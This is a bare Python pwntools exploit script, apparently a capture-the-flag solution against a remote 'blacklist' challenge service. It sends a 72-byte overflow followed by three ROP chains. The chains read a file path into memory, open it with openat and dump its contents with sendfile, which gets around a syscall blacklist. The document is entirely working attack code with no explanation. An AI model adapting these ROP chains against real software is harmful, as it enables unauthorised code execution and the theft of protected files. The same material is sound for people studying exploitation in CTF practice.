from pwn import *
from time import sleep
period = 1
entry = 0x401df2
writable = 0x4d1280
pop_rax = 0x0000000000401daf
syscall_ret = 0x000000000046ab05
pop_rdi = 0x00000000004017b6
pop_rsi = 0x00000000004024f6
pop_rdx = 0x0000000000401db2
pop_r10 = 0x0000000000401db1
payload = ""
payload += "A"*72
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(writable)
payload += p64(pop_rdx)
payload += p64(300)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall_ret)
payload += p64(entry)
#p = process("./blacklist")
p = remote("blacklist.fword.wtf",1236)
print len(payload)
#pause()
p.sendline(payload)
sleep(period)
p.sendline("/home/fbi/aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma.txt\x00")
sleep(period)
payload = ""
payload += "A"*72
payload += p64(pop_rdi)
payload += p64(0xffffff9c)
payload += p64(pop_rsi)
payload += p64(writable)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(257)
payload += p64(syscall_ret)
payload += p64(entry)
#pause()
p.sendline(payload)
sleep(period)
payload = ""
payload += "A"*72
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(3)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_r10)
payload += p64(5000)
payload += p64(pop_rax)
payload += p64(40)
payload += p64(syscall_ret)
p.sendline(payload)
sleep(period)
p.interactive()
